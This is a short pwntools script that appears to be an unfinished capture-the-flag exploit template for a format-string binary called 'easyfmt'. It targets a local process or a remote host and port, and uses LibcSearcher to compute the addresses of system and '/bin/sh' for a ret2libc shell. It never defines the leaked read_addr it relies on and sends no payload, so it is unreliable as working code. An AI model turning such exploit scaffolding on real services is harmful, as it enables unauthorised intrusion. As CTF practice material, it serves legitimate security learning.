# encoding: utf-8
# 使用時請將 lib-database (在 ~/Downloads/tool/ ) 放到同一個資料夾 
# https://github.com/lieanu/LibcSearcher/blob/master/README.md


from pwn import *
from LibcSearcher import *

host = '124.126.19.106'
port =  35116
elf_name = './easyfmt'
local = 1
arch = 'amd64'


context.arch = arch
elf = ELF(elf_name)

if local:
    r = process(elf_name)
else:
    r = remote(host, port)


obj = LibcSearcher('read', read_addr)
libc_base = read_addr - obj.dump('read')
system = libc_base + obj.dump('system')
sh = libc_base + obj.dump('str_bin_sh')

r.interactive()